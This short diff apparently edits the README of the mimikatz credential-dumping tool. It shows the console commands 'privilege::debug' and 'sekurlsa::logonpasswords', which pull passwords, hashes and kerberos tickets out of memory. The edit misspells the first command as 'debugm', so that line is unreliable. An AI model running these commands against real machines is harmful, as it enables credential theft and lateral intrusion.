@@ -13,7 +13,7 @@ It's now well known to extract plaintexts passwords, hash, PIN code and kerberos
   '#####'                                    with  13 modules * * */
 
 
-mimikatz # privilege::debug
+mimikatz # privilege::debugm
 Privilege '20' OK
  
 mimikatz # sekurlsa::logonpasswords
